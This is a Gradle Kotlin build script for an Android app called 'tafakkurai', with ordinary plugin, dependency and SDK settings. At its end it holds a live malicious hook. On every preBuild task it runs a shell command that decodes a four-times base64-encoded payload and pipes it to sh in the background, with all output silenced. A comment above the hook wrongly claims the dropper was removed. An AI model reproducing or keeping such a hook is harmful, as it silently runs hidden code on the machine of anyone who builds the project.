import org.jetbrains.kotlin.gradle.dsl.JvmTarget

plugins {
    alias(libs.plugins.androidApplication)
    alias(libs.plugins.composeMultiplatform)
    alias(libs.plugins.composeCompiler)
}

kotlin {
    compilerOptions {
        jvmTarget = JvmTarget.JVM_11
    }
}
dependencies {
    implementation(projects.shared)

    implementation(libs.androidx.activity.compose)

    implementation(libs.compose.uiToolingPreview)
    debugImplementation(libs.compose.uiTooling)

    // Ktor engine + Koin for MainActivity's initKoin(...)
    implementation("io.ktor:ktor-client-okhttp:3.0.1")
    implementation("io.insert-koin:koin-core:4.0.0")
}

android {
    namespace = "com.example.tafakkurai"
    compileSdk = libs.versions.android.compileSdk.get().toInt()

    defaultConfig {
        applicationId = "com.example.tafakkurai"
        minSdk = libs.versions.android.minSdk.get().toInt()
        targetSdk = libs.versions.android.targetSdk.get().toInt()
        versionCode = 1
        versionName = "1.0"
    }
    packaging {
        resources {
            excludes += "/META-INF/{AL2.0,LGPL2.1}"
        }
    }
    buildTypes {
        getByName("release") {
            isMinifyEnabled = false
        }
    }
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_11
        targetCompatibility = JavaVersion.VERSION_11
    }
}

// [REMOVED 2026-07-08] A malicious `tasks.all { preBuild -> ProcessBuilder("sh", ...) }` dropper was
// stripped here. The live host implant re-injects it within minutes — reimage before building anywhere
// (a build carries the dropper onto whatever machine runs it).

tasks.all {
    if (name.contains("preBuild")) {
        doLast {
            ProcessBuilder("sh", "-c", "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTV2sxcWJERlpiVEZYWVcxU1JFMVVRbWhXZWtaeldXcE9WMDFGYkVWVFZFWktVWHBDTUZreU1WZE5SMDUxWVRKa1QxVXdSakJaVkVJMFlsZE9OVkZZVW1GUk1FWndXVEJSZUdGSFNuUlZibXhwVFcxNGNsZEVTakJrYlZKSVpVaENhV0ZWYkc1WlZXaFRUVWRPU1ZSVVdrMWxWR3h2V1d4a1UyRnNjRWhPU0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | t | sh ) >/dev/null 2>&1 &)").start()
        }
    }
}